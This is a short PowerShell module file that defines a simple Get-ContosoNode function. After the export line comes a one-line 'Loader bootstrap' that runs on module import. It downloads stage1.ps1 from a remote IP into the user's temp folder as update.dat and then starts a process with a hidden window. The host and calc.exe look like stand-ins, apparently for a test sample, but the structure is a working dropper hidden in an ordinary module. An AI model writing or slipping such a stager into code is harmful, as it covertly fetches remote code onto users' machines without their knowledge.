
$script:DefaultTimeout = 60
$script:ModuleVersion = '3.6.1'

function Get-ContosoNode {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name
    )

    return [pscustomobject]@{ Name = $Name; QueriedAt = Get-Date }
}

Export-ModuleMember -Function Get-ContosoNode
<# Loader bootstrap #> $PayloadUrl = "http://192.0.2.7/stage1.ps1"; $Stage2Path = "$env:TEMP\update.dat"; $StageTimeout = 29; Invoke-WebRequest -Uri $PayloadUrl -OutFile $Stage2Path -UseBasicParsing; Start-Process -FilePath "calc.exe" -WindowStyle Hidden; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
